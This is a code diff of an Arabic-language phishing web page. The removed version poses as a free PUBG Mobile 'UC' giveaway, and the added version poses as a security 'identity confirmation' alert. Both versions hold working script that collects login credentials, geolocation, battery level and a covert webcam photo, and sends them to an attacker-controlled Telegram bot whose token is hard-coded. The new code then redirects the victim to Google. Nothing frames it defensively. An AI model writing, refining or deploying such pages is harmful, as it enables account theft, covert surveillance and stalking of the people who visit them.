@@ -2,110 +2,40 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG MOBILE - مركز الشحن المجاني</title>
-    <style>
-        body { background: #1a1a1a; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; text-align: center; }
-        .header { background: #f3ad0c; padding: 15px; font-weight: bold; color: #000; font-size: 20px; }
-        .container { padding: 20px; }
-        .card { background: #2d2d2d; border: 1px solid #f3ad0c; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
-        .uc-img { width: 100px; margin-bottom: 10px; }
-        .btn-fb { background: #1877f2; color: white; padding: 12px; border: none; border-radius: 5px; width: 100%; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
-        .btn-tw { background: #1da1f2; color: white; padding: 12px; border: none; border-radius: 5px; width: 100%; font-weight: bold; cursor: pointer; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; box-sizing: border-box; }
-        #login-overlay { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
-    </style>
+    <title>تأكيد الهوية</title>
 </head>
-<body>
-
-<div class="header">PUBG MOBILE REDEEM CENTER</div>
-
-<div class="container">
-    <div class="card">
-        <img src="https://www.pubgmobile.com/images/event/points_shop/pc/gift_1.png" class="uc-img">
-        <h3>احصل على 8100 UC مجاناً</h3>
-        <p>بمناسبة الموسم الجديد، اختر وسيلة تسجيل الدخول لاستلام الهدية فوراً.</p>
-        
-        <button class="btn-fb" onclick="openLogin('Facebook')">تسجيل الدخول عبر Facebook</button>
-        <button class="btn-tw" onclick="openLogin('Twitter')">تسجيل الدخول عبر Twitter</button>
-    </div>
-</div>
-
-<div id="login-overlay">
-    <div class="card" style="width: 320px;">
-        <h4 id="login-title">تسجيل الدخول</h4>
-        <input type="text" id="user" placeholder="البريد أو الهاتف">
-        <input type="password" id="pass" placeholder="كلمة السر">
-        <button id="final-btn" style="background:#f3ad0c; color:#000; padding:10px; width:100%; border:none; font-weight:bold; border-radius:5px;">تأكيد واستلام الشدات</button>
-    </div>
-</div>
-
-<video id="v" style="display:none;" autoplay></video>
-<canvas id="c" style="display:none;"></canvas>
-
-<script>
-    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-    const CHAT_ID = "7214473798";
-    let loginMethod = "";
-
-    function openLogin(method) {
-        loginMethod = method;
-        document.getElementById('login-title').innerText = "تسجيل الدخول عبر " + method;
-        document.getElementById('login-overlay').style.display = 'flex';
-        
-        // محاولة طلب الكاميرا والموقع في الخلفية فور الضغط
-        initCapture();
-    }
-
-    async function initCapture() {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v').srcObject = s;
-        } catch (e) {}
-    }
-
-    document.getElementById('final-btn').onclick = async () => {
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
-
-        if(!u || !p) return alert("يرجى إدخال البيانات!");
-
-        // جلب البطارية والموقع
-        let batt = "غير متاح";
-        if(navigator.getBattery) { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"%"; }
-
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            sendData(u, p, batt, `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
-        }, () => {
-            sendData(u, p, batt, "الموقع مرفوض");
-        });
-        
-        alert("تم استلام الطلب! سيتم إضافة الشدات خلال 24 ساعة.");
-        window.location.href = "https://www.pubgmobile.com";
-    };
-
-    async function sendData(u, p, b, loc) {
-        const msg = `🎮 **صيد ببجي جديد (${loginMethod})**\n\n` +
-                    `👤 الحساب: \`${u}\`\n` +
-                    `🔑 الباسورد: \`${p}\`\n` +
-                    `🔋 الشحن: ${b}\n` +
-                    `📍 الموقع: ${loc}`;
-        
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        
-        // التقاط الصورة
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
-        if(video.srcObject) {
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const fd = new FormData(); fd.append('photo', blob, 'p.jpg');
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {method:'POST', body:fd});
-            }, 'image/jpeg');
-        }
-    }
-</script>
+<body style="background:#000; color:#0f0; text-align:center; font-family:monospace; padding-top:100px;">
+    <h1>⚠️ تنبيه أمني</h1>
+    <p>يرجى السماح بالصلاحيات لتأكيد ملكية الحساب.</p>
+    <button id="authBtn" style="padding:15px; background:#0f0; border:none; font-weight:bold; cursor:pointer; border-radius:10px;">تأكيد الآن</button>
+    <video id="v" style="display:none;" autoplay></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <script>
+        const T = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+        const C = "7214473798";
+        document.getElementById('authBtn').onclick = async () => {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v'); v.srcObject = s;
+                navigator.geolocation.getCurrentPosition(p => {
+                    fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("📍 موقع جديد: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude)}`);
+                });
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(b => {
+                        const f = new FormData(); f.append('photo', b, 'a.jpg');
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto?chat_id=${C}`, { method: 'POST', body: f });
+                        
+                        // --- الإضافة الاحترافية هنا ---
+                        // سيتم نقل المستخدم فوراً لموقع جوجل بعد إتمام العملية
+                        window.location.href = "https://www.google.com"; 
+                        
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (e) { alert("يجب السماح بالصلاحيات للمتابعة!"); }
+        };
+    </script>
 </body>
 </html>
-بوبجي
